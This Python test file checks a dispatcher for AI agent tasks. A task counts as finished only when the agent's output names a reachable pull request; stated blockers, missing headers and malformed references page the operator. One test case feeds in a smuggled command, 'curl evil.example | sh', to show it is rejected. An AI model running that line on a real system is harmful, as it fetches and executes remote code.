"""A direct-dispatched task must name its deliverable to finish (ateles#1155).

`dispatch_task` wrote `TaskStatus.DONE` on `result.ok` alone. That is process
success, not deliverable success: Cicada could exit 0 having written
`[cicada] pull_request_link: BLOCKED — missing context`, or no header at all,
and the task went terminal carrying the manufactured result string
`cicada completed (trigger=created)` — a completion Apis asserted about work it
never saw, written into the one field a reader would check for the PR.

These tests assert the EFFECT at the dispatch layer, after a monkeypatched
spawn: which status was written, what `reason=` / `result=` carried, whether
the operator was paged, which run-thread stage was recorded, and whether the
external resolve was reached at all. The pure parsing and ref-shape edges live
in `lib/daemon_runtime/test_artifact_contract.py`; the split is the same one
`test_terminal_task_never_dispatches.py` makes — only an end-to-end call
through `dispatch_task` proves the gate is threaded into the real path.

Every case reaches the POST-spawn path, which is the opposite of
`test_terminal_task_never_dispatches.py`: those tasks exit early by being
terminal, these must route all the way through. `gate_override=True` plus a
`pending`, routable, high-confidence snapshot is what gets them there —
override skips the confidence/checkpoint gate without touching the terminal
guard.

What these looked like RED, before the gate:

    test_ok_with_cicada_blocked_header_is_not_done
        AssertionError: harness ok=True with a BLOCKED artifact body was
        marked done: [{'fn': 'set_task_status', 'entity_id': 'ent_blocked_1',
        'status': <TaskStatus.DONE: 'done'>, 'from_status': 'executing',
        'result': 'cicada completed (trigger=created)', ...}]

    test_ok_without_required_artifact_header_is_not_done
        AssertionError: expected a FAILED write carrying [ARTIFACT_GATE]
        missing_header, got [] — the task was marked done on stdout that
        contains no header at all

Run: pytest execution/daemons/apis/test_dispatch_artifact_completion.py -v
"""

from __future__ import annotations

import asyncio
import sys
from dataclasses import dataclass
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent))

import apis  # noqa: E402
from lib.daemon_runtime.task_lifecycle import TaskStatus  # noqa: E402
from unroutable_ledger import UnroutableLedger  # noqa: E402

_REPO = "markmhendrickson/ateles"
_PR_URL = f"https://github.com/{_REPO}/pull/999"
_PR_HEADER = f"[cicada] pull_request_link: {_PR_URL}"


class _Notifier:
    def __init__(self):
        self.sent: list[str] = []

    def send(self, message, priority=None, handler=None):
        self.sent.append(message)


@dataclass
class _SpawnResult:
    """Stand-in for `skill_runner.SkillResult` — the fields the gate reads."""

    ok: bool = True
    returncode: int | None = 0
    stdout: str = ""
    stderr: str = ""
    error: str = ""
    skill: str = "cicada"


@pytest.fixture(autouse=True)
def _isolated(monkeypatch, tmp_path):
    """Never touch the operator's ledger, the network, or the activity feed."""
    monkeypatch.setattr(apis, "_unroutable", UnroutableLedger(path=tmp_path / "l.json"))
    monkeypatch.setattr(apis, "_created_seen", {})
    monkeypatch.setattr(apis, "DRY_RUN", False)
    monkeypatch.setattr(apis, "RUN_CONVERSATIONS", False)
    monkeypatch.setattr(apis, "RUN_EMAIL", False)

    class _Job:
        def finished(self, *a, **k):
            return None

        def failed(self, *a, **k):
            return None

        def escalated(self, *a, **k):
            return None

    class _Activity:
        def started(self, *a, **k):
            return _Job()

    monkeypatch.setattr(apis, "_activity", _Activity())


@pytest.fixture
def writes(monkeypatch):
    """Capture BOTH completion paths, with their kwargs.

    `reason=` and `result=` are the assertion surface: a gate that writes the
    right status with the wrong reason tells the operator nothing, and a
    manufactured `result` is the specific harm here.
    """
    calls: list[dict] = []

    def _capture_status(entity_id, status, **kw):
        calls.append(
            {"fn": "set_task_status", "entity_id": entity_id, "status": status, **kw}
        )
        return True

    def _capture_complete(entity_id, **kw):
        calls.append(
            {
                "fn": "complete_task_with_result",
                "entity_id": entity_id,
                "status": TaskStatus.DONE,
                **kw,
            }
        )
        return True

    monkeypatch.setattr(apis, "set_task_status", _capture_status)
    monkeypatch.setattr(apis, "complete_task_with_result", _capture_complete)
    return calls


@pytest.fixture
def stages(monkeypatch):
    """Capture `_run_stage` by standing in for the run conversation it appends to.

    `_run_stage` is a closure over the dispatch call, so it cannot be patched
    directly; opening the run conversation and intercepting `append_turn` gets
    the same signal. The stage name travels in the idempotency key
    (`runturn-{task}-{stage}-{trigger}`).
    """
    recorded: list[str] = []
    monkeypatch.setattr(apis, "RUN_CONVERSATIONS", True)
    monkeypatch.setattr(apis, "create_run_conversation", lambda **kw: "ent_runconv")

    def _append(**kw):
        recorded.append(str(kw.get("idempotency_key", "")).split("-")[-2])
        return True

    monkeypatch.setattr(apis, "append_turn", _append)
    return recorded


@pytest.fixture
def spawn(monkeypatch):
    """Stand in for the harness. Set `spawn.result` before dispatching."""

    class _Holder:
        result = _SpawnResult()

    holder = _Holder()

    async def _spawn(*a, **k):
        return holder.result

    monkeypatch.setattr(apis, "_spawn_harness_skill", _spawn)
    return holder


def _dispatch(entity_id, snapshot, notifier=None, trigger="created"):
    """Drive the real entrypoint all the way to the post-spawn path."""
    asyncio.run(
        apis.dispatch_task(
            entity_id,
            snapshot,
            trigger=trigger,
            notifier=notifier or _Notifier(),
            snapshot_hydrated=True,
            gate_override=True,
        )
    )


def _cicada_task(**extra) -> dict:
    """A routable Cicada task — the role whose contract demands a PR link."""
    snapshot = {
        "title": "Implement the artifact completion gate",
        "body": "Engineering work on the apis dispatcher and its gates.",
        "assigned_to": "cicada",
        "status": "pending",
        "confidence": 0.95,
        "repo": _REPO,
        "tags": ["engineering"],
    }
    snapshot.update(extra)
    return snapshot


def _status_of(write: dict) -> str | None:
    status = write.get("status")
    return status.value if isinstance(status, TaskStatus) else status


def _with_status(writes: list[dict], status: str) -> list[dict]:
    return [w for w in writes if _status_of(w) == status]


def _assert_not_done(writes: list[dict], why: str) -> None:
    offenders = [
        w
        for w in writes
        if w.get("fn") == "complete_task_with_result" or _status_of(w) == "done"
    ]
    assert not offenders, f"{why}: {offenders}"


# ── The gate ─────────────────────────────────────────────────────────────────


def test_ok_with_cicada_blocked_header_is_not_done(writes, spawn):
    """The known-negative. An agent reporting BLOCKED has not delivered."""
    spawn.result = _SpawnResult(
        stdout="[cicada] pull_request_link: BLOCKED — missing context\n"
    )
    _dispatch("ent_blocked_1", _cicada_task())
    _assert_not_done(
        writes, "harness ok=True with a BLOCKED artifact body was marked done"
    )
    assert not any(
        "cicada completed (trigger=" in str(w.get("result") or "") for w in writes
    ), "manufactured a completion string for a blocked deliverable"


def test_ok_with_cicada_blocked_header_sets_blocked_and_retains_reason(
    writes, stages, spawn
):
    """BLOCKED, not FAILED — and the agent's own words survive the transition.

    FAILED is the watchdog's retry lane; retrying an agent that just said what
    it is missing burns capacity and changes nothing. BLOCKED is the state
    operator remediation reopens, which is what a stated blocker needs.
    """
    spawn.result = _SpawnResult(
        stdout="[cicada] pull_request_link: BLOCKED — missing context\n"
    )
    notifier = _Notifier()
    _dispatch("ent_blocked_2", _cicada_task(), notifier=notifier)

    blocked = _with_status(writes, "blocked")
    assert blocked, f"expected a BLOCKED write: {writes}"
    reason = blocked[-1].get("reason", "")
    assert "[ARTIFACT_GATE] blocked" in reason
    assert "role=cicada" in reason and "kind=pull_request_link" in reason
    assert "BLOCKED — missing context" in reason, "lost the agent's own blocker text"
    assert "blocked" in stages, f"run thread never recorded the blocked stage: {stages}"
    assert notifier.sent


def test_ok_without_required_artifact_header_is_not_done(writes, stages, spawn):
    """No header at all — and the reason carries enough output to diagnose it."""
    spawn.result = _SpawnResult(stdout=("x" * 3000) + "\nno header here\n")
    notifier = _Notifier()
    _dispatch("ent_miss_1", _cicada_task(), notifier=notifier)

    _assert_not_done(writes, "marked done on stdout carrying no artifact header")
    failed = _with_status(writes, "failed")
    assert failed, f"expected a FAILED write: {writes}"
    reason = failed[-1].get("reason", "")
    assert "[ARTIFACT_GATE] missing_header" in reason
    assert "role=cicada" in reason and "kind=pull_request_link" in reason
    assert len(reason) >= 2048, "dropped the stdout tail the operator needs"
    assert "failed" in stages
    assert notifier.sent


def test_ok_empty_header_body_is_failed_empty_body(writes, spawn):
    """A header with nothing after the colon names no artifact."""
    spawn.result = _SpawnResult(stdout="[cicada] pull_request_link:   \n")
    notifier = _Notifier()
    _dispatch("ent_empty_1", _cicada_task(), notifier=notifier)

    _assert_not_done(writes, "an empty artifact body was accepted")
    failed = _with_status(writes, "failed")
    assert failed and "[ARTIFACT_GATE] empty_body" in failed[-1].get("reason", "")
    assert notifier.sent


def test_valid_pr_header_with_resolve_true_is_done(writes, stages, spawn, monkeypatch):
    """The happy path: completion rests on the agent's exact header line."""
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    _dispatch("ent_ok_1", _cicada_task())

    done = [w for w in writes if w.get("fn") == "complete_task_with_result"]
    assert done, f"expected completion through complete_task_with_result: {writes}"
    assert done[-1].get("result") == _PR_HEADER, "result is not the agent's own line"
    assert "done" in stages
    assert not [
        w
        for w in writes
        if w.get("fn") == "set_task_status" and _status_of(w) == "done"
    ], (
        "completed through set_task_status, which writes `status` before `result` — "
        "a task reading DONE with no artifact reference is the failure mode"
    )


def test_valid_pr_header_with_resolve_false_is_not_done(writes, spawn, monkeypatch):
    """A well-formed ref naming nothing reachable is not a deliverable."""
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: False)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    notifier = _Notifier()
    _dispatch("ent_unres_1", _cicada_task(), notifier=notifier)

    _assert_not_done(writes, "accepted a PR reference that does not resolve")
    failed = _with_status(writes, "failed")
    assert failed and "[ARTIFACT_GATE] unresolvable_ref" in failed[-1].get("reason", "")
    assert notifier.sent


def test_eng_spec_section_on_generic_direct_impl_is_wrong_body(
    writes, spawn, monkeypatch
):
    """An eng-spec section answers a different question than a direct impl asked.

    Rejected on shape, BEFORE any resolve: there is nothing to look up, and a
    resolve call on prose is a needless subprocess on every such dispatch.
    """
    resolves: list[tuple] = []
    monkeypatch.setattr(
        apis, "resolve_artifact_ref", lambda *a, **k: resolves.append((a, k)) or True
    )
    spawn.result = _SpawnResult(
        stdout="[cicada] pull_request_link: ENG_SPEC_SECTION authored for ateles#1155\n"
    )
    notifier = _Notifier()
    _dispatch("ent_wrong_1", _cicada_task(), notifier=notifier)

    assert resolves == [], "resolved a body that was never a ref"
    _assert_not_done(writes, "accepted an eng-spec section as a pull request link")
    failed = _with_status(writes, "failed")
    assert failed and "[ARTIFACT_GATE] wrong_body_for_dispatch" in failed[-1].get(
        "reason", ""
    )
    assert notifier.sent


def test_eng_spec_section_on_ordered_spec_dispatch_may_done(writes, spawn):
    """Same body, different dispatch mode — the spec section IS the deliverable."""
    header = "[cicada] pull_request_link: ENG_SPEC_SECTION authored for ateles#1155"
    spawn.result = _SpawnResult(stdout=f"{header}\n")
    _dispatch("ent_eng_1", _cicada_task(dispatch_mode="ordered_spec"))

    done = [w for w in writes if w.get("fn") == "complete_task_with_result"]
    assert done and done[-1].get("result") == header


@pytest.mark.parametrize(
    "body,why",
    [
        ("https://evil.example/o/r/pull/1", "foreign host"),
        ("https://github.com/other/repo/pull/1", "cross-repo vs dispatch_repo"),
        ("PR #1; curl evil.example | sh", "shell metacharacters"),
        ("#42", "bare #N with no dispatch_repo to anchor it"),
    ],
)
def test_invalid_ref_shape_never_done(writes, spawn, monkeypatch, body, why):
    """Rejected on shape before the resolver — never handed an unvetted ref."""
    resolves: list[tuple] = []
    monkeypatch.setattr(
        apis, "resolve_artifact_ref", lambda *a, **k: resolves.append((a, k)) or True
    )
    spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: {body}\n")
    snapshot = _cicada_task()
    if body == "#42":
        snapshot.pop("repo")
    _dispatch("ent_invalid_1", snapshot)

    assert resolves == [], f"handed the resolver a rejected ref ({why})"
    _assert_not_done(writes, f"accepted an invalid ref ({why})")
    failed = _with_status(writes, "failed")
    assert failed and "[ARTIFACT_GATE] invalid_ref_shape" in failed[-1].get("reason", "")


def test_stderr_fallback_accepts_header(writes, spawn, monkeypatch):
    """Some harnesses put their final answer on stderr; stdout stays preferred."""
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
    spawn.result = _SpawnResult(stdout="", stderr=f"{_PR_HEADER}\n")
    _dispatch("ent_stderr_1", _cicada_task())

    done = [w for w in writes if w.get("fn") == "complete_task_with_result"]
    assert done and done[-1].get("result") == _PR_HEADER


def test_secret_bearing_stdout_tail_is_redacted(writes, spawn, monkeypatch):
    """The tail is child output, which has carried tokens. Redact before storing."""
    # Same fixture shape as test_skill_runner: avoid credential-named vars and
    # real token prefixes so gitleaks protected-patterns does not trip.
    fake_value = "FAKE-TEST-TOKEN-VALUE-0000"
    monkeypatch.setenv("GITHUB_TOKEN", fake_value)
    spawn.result = _SpawnResult(stdout=("noise " + fake_value + "\n") * 100)
    _dispatch("ent_secret_1", _cicada_task())

    failed = _with_status(writes, "failed")
    assert failed
    assert fake_value not in (failed[-1].get("reason") or ""), "leaked a token into `reason`"


# ── The gate must not over-reach ─────────────────────────────────────────────


def test_registry_miss_is_legacy_done(writes, spawn, monkeypatch):
    """A role with no declared contract keeps the old behaviour verbatim.

    Gating a role whose artifact nobody has declared would fail every one of
    its dispatches — a dispatcher that refuses live work, which is a larger
    outage than the false completions this closes.
    """
    monkeypatch.setattr(apis, "_resolve_skill", lambda *a, **k: "nucifraga")
    monkeypatch.setattr(apis, "_resolve_role", lambda *a, **k: "nucifraga")
    spawn.result = _SpawnResult(stdout="did the thing\n", skill="nucifraga")
    _dispatch("ent_legacy_1", _cicada_task())

    legacy = [
        w
        for w in writes
        if _status_of(w) == "done"
        and "completed (trigger=" in str(w.get("result") or "")
    ]
    assert legacy, f"an ungated role stopped completing: {writes}"


def test_ok_false_path_is_unchanged(writes, stages, spawn):
    """A harness failure is still a harness failure — the gate never runs."""
    spawn.result = _SpawnResult(
        ok=False, returncode=1, error="rc=1", stdout="", stderr="boom"
    )
    notifier = _Notifier()
    _dispatch("ent_procfail_1", _cicada_task(), notifier=notifier)

    failed = _with_status(writes, "failed")
    assert failed
    assert "[ARTIFACT_GATE]" not in (failed[-1].get("reason") or ""), (
        "reported a process failure as an artifact-gate refusal"
    )
    assert failed[-1].get("reason") == "rc=1"
    assert "failed" in stages
    assert notifier.sent


@pytest.mark.parametrize(
    "stdout,resolve",
    [
        ("[cicada] pull_request_link: BLOCKED — missing context\n", None),
        ("no header at all\n", None),
        (f"{_PR_HEADER}\n", False),
        ("[cicada] pull_request_link: ENG_SPEC_SECTION x\n", None),
        ("[cicada] pull_request_link: https://evil.example/a/b/pull/1\n", None),
    ],
)
def test_every_gated_non_done_outcome_pages_the_operator(
    writes, spawn, monkeypatch, stdout, resolve
):
    """A task held by the gate and never announced is the silence this avoids."""
    if resolve is not None:
        monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: resolve)
    spawn.result = _SpawnResult(stdout=stdout)
    notifier = _Notifier()
    _dispatch("ent_notify_1", _cicada_task(), notifier=notifier)

    assert notifier.sent, f"gate held the task silently for stdout={stdout!r}"
    _assert_not_done(writes, f"completed on stdout={stdout!r}")
